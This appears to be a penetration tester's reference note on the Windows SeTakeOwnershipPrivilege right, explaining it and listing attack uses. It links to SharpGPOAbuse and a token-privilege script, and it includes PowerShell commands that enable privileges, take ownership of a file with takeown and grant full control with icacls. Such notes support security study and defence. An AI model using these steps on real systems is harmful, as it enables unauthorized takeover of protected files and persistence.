# SeTakeOwnershipPrivilege

[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grant an account to change the ownership of any object as every object has a owner. This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object and Administrators are assigned this privilege by default. There are rare and legitimate reasons for account to take ownership over some object it does not own. In practice excessive requirement to change the ownership of some object is problematic as an exposure of objects that probably should be owned by the original owner in the first place. Service accounts that are required to modify object in some storage task were object need to change ownership are more legitmate and common actuallity than a regular user account with this privilege.

Configuration under Group Policy settings:
- `Computer Configuration ->  Windows Settings -> Security Settings -> Local Policies -> User Rights Assignment`

#### Attacks

- GPO abuse using [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
- If we require this privilege for [[Windows-Persistence]] and this privilege is not enabled.
	- We can enable with the [EnableAllTokenPrivs script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) 
		- detailed in [Lee Holmes's Blog Post](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) 
		- Extending the concept with [@markmotig - EnableAllTokenPrivileges](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77)

```powershell
import-module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
# Confirm with:
whoami /priv
# takeownership of a file
takeown /f 'C:$PATH...'
# Confirm with:
Get-ChildItem -Path 'C:$PATH...' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
# Modifying the file ACL
# Grant full or partial privileges with icacls
icacls 'C:$PATH...' /grant $username:F
```
Consider reviewing the [[Icacls-Command]] for permissions and syntax to set more granular permissions than just Full.


## References

[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)
[WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) 
[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
[EnableAllTokenPrivs script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) 
[Lee Holmes's Blog Post](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/)
[@markmotig - EnableAllTokenPrivileges](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77)